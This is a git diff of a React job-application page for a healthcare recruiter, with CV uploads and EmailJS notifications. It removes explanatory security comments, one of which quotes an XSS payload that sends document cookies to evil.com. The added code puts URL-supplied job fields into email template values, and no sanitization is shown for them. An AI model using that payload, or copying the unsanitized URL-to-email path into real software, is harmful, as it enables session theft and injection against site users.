@@ -28,15 +28,6 @@ import {
 // ─────────────────────────────────────────────────────────────────────────────
 // EVS Healthcare — Job Application Page (FREE with EmailJS)
 // Features: CV upload to Cloudinary, email notifications, auto-reply via linked template
-//
-// SECURITY NOTES (read before editing):
-// This component talks directly to two third-party APIs from the browser
-// (Cloudinary for uploads, EmailJS for mail). That architecture means some
-// classes of risk CANNOT be fully closed from inside this file — they need a
-// backend/serverless function in front of these calls. Every mitigation below
-// is labeled as either a REAL FIX (closes the gap) or a DETERRENT (raises the
-// bar for casual abuse but is not a substitute for server-side enforcement).
-// See the comments inline at each control point.
 // ─────────────────────────────────────────────────────────────────────────────
 
 // ── EmailJS Configuration (from .env) ──
@@ -52,36 +43,18 @@ const CLOUDINARY_CONFIG = {
   UPLOAD_PRESET: import.meta.env.VITE_CLOUDINARY_UPLOAD_PRESET,
 };
 
-// SECURITY [REAL FIX — OWASP A05: Security Misconfiguration]:
-// The original code had `|| "olamilake95@gmail.com"` as a fallback here.
-// Anything in client JS is publicly readable regardless of env vars, so this
-// doesn't "hide" the address — but a hardcoded fallback means the app fails
-// SILENTLY into a private inbox if the env var is ever missing/misconfigured
-// in a deploy (e.g. a fork, a staging env, a copy-pasted repo). Failing loudly
-// instead means misconfiguration gets caught in testing, not in production
-// after someone else's CV lands in your personal email by accident.
 const ADMIN_EMAIL = import.meta.env.VITE_ADMIN_EMAIL;
 
 if (!ADMIN_EMAIL && import.meta.env.DEV) {
-  // eslint-disable-next-line no-console
-  console.error(
-    "VITE_ADMIN_EMAIL is not set. Submissions will fail until this is configured."
-  );
+  console.error("VITE_ADMIN_EMAIL is not set. Submissions will fail until this is configured.");
 }
 
-// SECURITY [REAL FIX — OWASP A09: Logging Failures, reduced surface]:
-// The original logged full config status (service IDs, "Set"/"Missing" for
-// keys) to the console on every load. EmailJS/Cloudinary public keys are
-// *meant* to be public, so this isn't a secrets leak — but it's free
-// reconnaissance for anyone mapping your stack, and it's noise in
-// production. Gated behind DEV so it only runs locally.
 if (import.meta.env.DEV) {
-  // eslint-disable-next-line no-console
   console.log("[dev] EmailJS service configured:", Boolean(EMAILJS_CONFIG.SERVICE_ID));
-  // eslint-disable-next-line no-console
   console.log("[dev] Cloudinary cloud configured:", Boolean(CLOUDINARY_CONFIG.CLOUD_NAME));
 }
 
+// ── Job data (fallback if no job selected) ──
 const JOBS = [
   {
     id: 1,
@@ -151,16 +124,7 @@ const JOBS = [
   },
 ];
 
-// SECURITY [REAL FIX — OWASP A03: Injection / Stored XSS]:
-// Every text field here used to go straight into `templateParams` and from
-// there into an email. If the EmailJS template ever renders fields as HTML
-// (many "pretty" admin notification templates do), an applicant could submit
-// `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` in the
-// message field and it would execute wherever that HTML is rendered. This
-// strips angle brackets and collapses whitespace — it does not replace
-// server-side sanitization if you ever render this data elsewhere (e.g. an
-// admin dashboard), but it closes the most common injection path for the
-// email pipeline itself.
+// ── Utility Functions ──
 const sanitizeInput = (value, maxLength = 500) => {
   if (typeof value !== "string") return "";
   return value
@@ -170,18 +134,9 @@ const sanitizeInput = (value, maxLength = 500) => {
     .slice(0, maxLength);
 };
 
-// SECURITY [REAL FIX]: tighter email validation than the original
-// `\S+@\S+\.\S+` (which accepts "a@b.c" and other non-deliverable strings).
-// Still intentionally permissive — full RFC 5322 validation is a rabbit hole
-// that rejects valid real-world addresses more often than it catches bad
-// ones. The actual guarantee of deliverability can only come from a
-// verification email, which is a server-side concern.
 const isValidEmail = (value) =>
   /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(value.trim());
 
-// SECURITY [REAL FIX]: basic phone shape check. UK numbers, international
-// format, spaces/dashes/parens all pass; this just rejects empty/junk input
-// rather than trying to be a full phone-number validator.
 const isValidPhone = (value) =>
   /^[+()0-9\s-]{7,20}$/.test(value.trim());
 
@@ -203,6 +158,7 @@ export default function Apply() {
   const [error, setError] = useState(null);
   const [isUploading, setIsUploading] = useState(false);
 
+  // ── Form State ──
   const [formData, setFormData] = useState({
     fullName: "",
     email: "",
@@ -213,33 +169,21 @@ export default function Apply() {
     message: "",
   });
 
-  // SECURITY [DETERRENT — not a real bot defense, see note at submit handler]:
-  // Honeypot field. Real users never see or fill this (visually hidden, not
-  // just `display:none` which some bots skip over — see CSS). Most
-  // unsophisticated form-spam bots fill every input they find, so a non-empty
-  // value here is a strong signal of automated submission. This stops the
-  // cheapest bots for free; it does nothing against a targeted human attacker
-  // or a bot that specifically parses for honeypot patterns.
+  // ── Honeypot ──
   const [hp, setHp] = useState("");
 
-  const [cvData, setCvData] = useState(null); // Stores { url, filename, public_id }
+  // ── CV State ──
+  const [cvData, setCvData] = useState(null);
   const [cvPreview, setCvPreview] = useState(null);
 
-  // SECURITY [DETERRENT — client-side rate limiting]:
-  // Tracks the last submission time so the same browser session can't fire
-  // the email API repeatedly in a tight loop. This is trivially bypassed by
-  // anyone calling the EmailJS API directly (it's a public endpoint with a
-  // public key, same as before) — the REAL fix for spam/abuse protection is
-  // a server-side rate limit or CAPTCHA verification in front of EmailJS.
-  // This just stops accidental double-submits and the laziest scripted abuse.
+  // ── Rate limiting ──
   const lastSubmitRef = useRef(0);
   const SUBMIT_COOLDOWN_MS = 15000;
 
-  // Initialize EmailJS
+  // ── Initialize EmailJS ──
   useEffect(() => {
     if (!EMAILJS_CONFIG.PUBLIC_KEY) {
       if (import.meta.env.DEV) {
-        // eslint-disable-next-line no-console
         console.error("EmailJS Public Key is missing. Check your .env file.");
       }
       return;
@@ -248,13 +192,12 @@ export default function Apply() {
       emailjs.init(EMAILJS_CONFIG.PUBLIC_KEY);
     } catch (err) {
       if (import.meta.env.DEV) {
-        // eslint-disable-next-line no-console
         console.error("Failed to initialize EmailJS:", err);
       }
     }
   }, []);
 
-  // Load Cloudinary Widget Script
+  // ── Load Cloudinary Widget Script ──
   useEffect(() => {
     if (document.getElementById('cloudinary-widget-script')) return;
 
@@ -272,31 +215,67 @@ export default function Apply() {
     };
   }, []);
 
-  // Get job from URL query params
+  // ── Get job from URL query params (NEW: enhanced to capture all job details) ──
   useEffect(() => {
     const params = new URLSearchParams(location.search);
-    const id = params.get("job");
-    if (id) {
-      const job = JOBS.find((j) => j.id === parseInt(id, 10));
+    
+    // Check if job details are passed as URL parameters (from Jobs page)
+    const jobId = params.get("jobId") || params.get("job");
+    
+    if (jobId) {
+      // Try to find job by ID in JOBS array
+      let job = JOBS.find((j) => j.id === parseInt(jobId, 10));
+      
+      // If not found by ID, try to build job from URL parameters
+      if (!job) {
+        const jobTitle = params.get("jobTitle");
+        const jobLocation = params.get("jobLocation");
+        const jobPay = params.get("jobPay");
+        const jobType = params.get("jobType");
+        const jobDepartment = params.get("jobDepartment");
+        const jobShift = params.get("jobShift");
+        const jobExperience = params.get("jobExperience");
+        
+        if (jobTitle) {
+          job = {
+            id: parseInt(jobId, 10) || 0,
+            title: jobTitle,
+            location: jobLocation || "Location not specified",
+            pay: jobPay || "Pay not specified",
+            type: jobType || "Not specified",
+            department: jobDepartment || "Not specified",
+            shift: jobShift || "Not specified",
+            experience: jobExperience || "Not specified",
+            urgent: params.get("urgent") === "true",
+          };
+        }
+      }
+      
       if (job) {
         setSelectedJob(job);
+        
+        // Pre-fill the experience field if job experience is available
+        if (job.experience && job.experience !== "Not specified") {
+          setFormData(prev => ({
+            ...prev,
+            experience: job.experience || prev.experience,
+          }));
+        }
       }
     }
   }, [location]);
 
+  // ── Handle form changes ──
   const handleChange = (e) => {
     const { name, value } = e.target;
     const limit = FIELD_LIMITS[name];
     setFormData((prev) => ({
       ...prev,
-      // SECURITY [REAL FIX]: hard length cap applied at input time, not just
-      // on submit — prevents a pasted 50,000-character string from ever
-      // entering state, which is cheap insurance against quota abuse on your
-      // EmailJS plan and against pathological re-render cost on every keystroke.
       [name]: limit ? value.slice(0, limit) : value,
     }));
   };
 
+  // ── Validation ──
   const validateStep = () => {
     if (step === 1) {
       if (!formData.fullName.trim()) {
@@ -366,25 +345,8 @@ export default function Apply() {
           uploadPreset: CLOUDINARY_CONFIG.UPLOAD_PRESET,
           sources: ['local', 'camera', 'url', 'google_drive', 'dropbox'],
           multiple: false,
-          // SECURITY [DETERRENT, not a REAL FIX — read this]:
-          // `clientAllowedFormats` and `maxFileSize` are enforced by the
-          // widget's JS in the browser. Anyone with devtools open can call
-          // Cloudinary's unsigned upload API directly with any file,
-          // bypassing this widget entirely — these settings only stop
-          // accidental wrong-file selection by genuine applicants, they do
-          // NOT stop a deliberate attacker. The REAL fix is either:
-          //   (a) an unsigned preset configured server-side in Cloudinary's
-          //       dashboard with format/size restrictions enforced at the
-          //       Cloudinary API level (not just the widget), or
-          //   (b) routing uploads through your own backend, which validates
-          //       file content (not just extension) before forwarding to
-          //       Cloudinary with a signed request.
-          // At minimum, go set the equivalent restrictions on the upload
-          // preset itself in the Cloudinary console — that enforcement
-          // happens server-side at Cloudinary regardless of what the client
-          // sends.
           clientAllowedFormats: ['pdf', 'doc', 'docx', 'txt', 'rtf'],
-          maxFileSize: 5000000, // 5MB
+          maxFileSize: 5000000,
           showAdvancedOptions: false,
           cropping: false,
           styles: {
@@ -419,11 +381,6 @@ export default function Apply() {
           }
 
           if (result && result.event === 'success') {
-            // SECURITY [REAL FIX, partial]: re-check the extension on the
-            // returned filename/format even though the widget already
-            // filtered. Defense in depth — if the widget config is ever
-            // changed or bypassed, this is a second gate before the file
-            // reference enters app state and gets emailed to the admin.
             const allowed = ['pdf', 'doc', 'docx', 'txt', 'rtf'];
             const format = (result.info.format || '').toLowerCase();
             if (format && !allowed.includes(format)) {
@@ -460,12 +417,6 @@ export default function Apply() {
       throw new Error("Application service is temporarily unavailable. Please try again later.");
     }
 
-    // SECURITY [REAL FIX]: every value placed into the email template is
-    // passed through sanitizeInput first, closing the injection path
-    // described above. This is applied here (at the boundary right before
-    // the data leaves the app) rather than relying solely on the per-field
-    // caps in handleChange, so the email payload is sanitized even if a
-    // field's value ever changes through another path.
     const templateParams = {
       to_email: ADMIN_EMAIL,
       to_name: "EVS Healthcare Recruitment",
@@ -482,6 +433,8 @@ export default function Apply() {
       job_location: selectedJob?.location || "",
       job_pay: selectedJob?.pay || "",
       job_type: selectedJob?.type || "",
+      job_department: selectedJob?.department || "",
+      job_shift: selectedJob?.shift || "",
       submitted_at: new Date().toLocaleString(),
 
       cv_filename: cvData?.filename || "No CV attached",
@@ -497,7 +450,6 @@ export default function Apply() {
       return response;
     } catch (err) {
       if (import.meta.env.DEV) {
-        // eslint-disable-next-line no-console
         console.error("EmailJS send failed:", err);
       }
       if (err?.text) {
@@ -516,12 +468,6 @@ export default function Apply() {
   const handleSubmit = async (e) => {
     e.preventDefault();
 
-    // SECURITY [DETERRENT]: honeypot check. If this hidden field has any
-    // value, a bot filled it — silently reject without telling the bot why
-    // (returning a generic success-like no-op here would tip off a more
-    // sophisticated bot that it's being filtered; in practice we just stop
-    // here and let validateStep below run normally for genuine partial fills,
-    // but a non-empty honeypot always blocks submission).
     if (hp) {
       setError("Something went wrong. Please refresh and try again.");
       return;
@@ -529,7 +475,6 @@ export default function Apply() {
 
     if (!validateStep()) return;
 
-    // SECURITY [DETERRENT]: client-side cooldown between submissions.
     const now = Date.now();
     if (now - lastSubmitRef.current < SUBMIT_COOLDOWN_MS) {
       setError("Please wait a moment before submitting again.");
@@ -553,7 +498,7 @@ export default function Apply() {
     }
   };
 
-  // ── Render Steps ──────────────────────────────────────────────────────────
+  // ── Render Steps ──
 
   const renderStep1 = () => (
     <motion.div
@@ -638,11 +583,7 @@ export default function Apply() {
           />
         </div>
 
-        {/* SECURITY [DETERRENT]: honeypot input. Visually and from-tab-order
-            hidden via CSS (.apply-honeypot), not display:none — some bots
-            specifically skip display:none fields, fewer skip this pattern.
-            tabIndex -1 and aria-hidden keep it out of keyboard/AT flow for
-            real users. */}
+        {/* Honeypot */}
         <div className="apply-honeypot" aria-hidden="true">
           <label htmlFor="company-website">Company website</label>
           <input
@@ -709,6 +650,21 @@ export default function Apply() {
             <option value="Senior">Senior (5+ years)</option>
             <option value="Managerial">Managerial</option>
           </select>
+          {/* Show pre-filled job experience hint */}
+          {selectedJob?.experience && selectedJob.experience !== "Not specified" && (
+            <div style={{ 
+              marginTop: 6, 
+              fontSize: 12, 
+              color: '#64748b',
+              fontFamily: "'Inter', sans-serif",
+              display: 'flex',
+              alignItems: 'center',
+              gap: 6,
+            }}>
+              <span style={{ color: '#C4972A' }}>•</span>
+              Job requires: <strong>{selectedJob.experience}</strong>
+            </div>
+          )}
         </div>
 
         <div className="apply-form-group">
@@ -823,6 +779,18 @@ export default function Apply() {
                 <span className="apply-review-label">Pay</span>
                 <span className="apply-review-value">{selectedJob.pay}</span>
               </div>
+              {selectedJob.type && (
+                <div className="apply-review-item">
+                  <span className="apply-review-label">Type</span>
+                  <span className="apply-review-value">{selectedJob.type}</span>
+                </div>
+              )}
+              {selectedJob.shift && selectedJob.shift !== "Not specified" && (
+                <div className="apply-review-item">
+                  <span className="apply-review-label">Shift</span>
+                  <span className="apply-review-value">{selectedJob.shift}</span>
+                </div>
+              )}
             </div>
           )}
 
@@ -931,7 +899,7 @@ export default function Apply() {
     );
   };
 
-  // ── Main Render ──────────────────────────────────────────────────────────
+  // ── Main Render ──
 
   if (isSubmitted) {
     return (
@@ -958,6 +926,9 @@ export default function Apply() {
               <span className="apply-job-chip">{selectedJob.location}</span>
               <span className="apply-job-chip apply-job-chip-pay">{selectedJob.pay}</span>
               {selectedJob.urgent && <span className="apply-job-chip apply-job-chip-urgent">Urgent</span>}
+              {selectedJob.type && selectedJob.type !== "Not specified" && (
+                <span className="apply-job-chip">{selectedJob.type}</span>
+              )}
             </div>
           )}
           <p className="apply-subtitle">
@@ -1041,8 +1012,7 @@ export default function Apply() {
   );
 }
 
-// Styles extracted to their own component purely so the JSX above stays
-// readable — behaviour is identical to having the <style> tag inline.
+// ── Styles ──
 function ApplyStyles() {
   return (
     <style>{`
@@ -1362,9 +1332,6 @@ function ApplyStyles() {
       }
       .apply-file-remove:hover { color: var(--danger); background: rgba(220,38,38,0.08); }
 
-      /* SECURITY: honeypot field — hidden from sighted users and keyboard
-         tab order without using display:none (some bots specifically skip
-         display:none / visibility:hidden fields when filling forms). */
       .apply-honeypot {
         position: absolute;
         width: 1px;
